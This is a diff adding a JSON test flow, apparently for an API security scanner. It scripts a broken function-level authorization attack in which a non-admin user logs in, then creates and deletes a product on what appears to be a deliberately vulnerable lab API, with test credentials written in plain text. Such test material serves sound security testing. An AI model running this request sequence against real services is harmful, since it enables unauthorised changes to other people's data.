@@ -1,0 +1,61 @@
+{
+  "id": "flow_bfla_evedavis_creates_deletes_products",
+  "name": "BFLA: EveDavis (Regular User) Creates and Deletes Products",
+  "description": "EveDavis, a non-admin user, logs in and exploits BFLA to create and then delete a product.",
+  "headers": {},
+  "steps": [
+    {
+      "id": "step_login_evedavis_bfla_product",
+      "name": "Login EveDavis",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/auth/login?username={{eveUsername}}&password={{evePassword}}",
+      "onFailure": "stop",
+      "extract": {
+        "eve_token": "body.access_token"
+      }
+    },
+    {
+      "id": "step_evedavis_create_product_bfla",
+      "name": "EveDavis Creates Product (BFLA)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/products?name=EveSecretProduct&price=1.99&description=UnauthorizedCreation&category=BFLA",
+      "headers": {
+        "Authorization": "Bearer {{eve_token}}"
+      },
+      "onFailure": "stop",
+      "extract": {
+        "eve_product_id": "body.product_id"
+      }
+    },
+    {
+      "id": "step_evedavis_verify_product_creation_bfla",
+      "name": "EveDavis Verifies Product Creation",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/{{eve_product_id}}",
+      "headers": {
+        "Authorization": "Bearer {{eve_token}}"
+      },
+      "onFailure": "stop"
+    },
+    {
+      "id": "step_evedavis_delete_product_bfla",
+      "name": "EveDavis Deletes Product (BFLA)",
+      "type": "request",
+      "method": "DELETE",
+      "url": "{{baseUrl}}/api/products/{{eve_product_id}}",
+      "headers": {
+        "Authorization": "Bearer {{eve_token}}"
+      },
+      "onFailure": "stop"
+    }
+  ],
+  "staticVars": {
+    "baseUrl": "http://vampi.bowz.fr",
+    "eveUsername": "EveDavis",
+    "evePassword": "EvePass5%"
+  },
+  "visualLayout": {}
+}
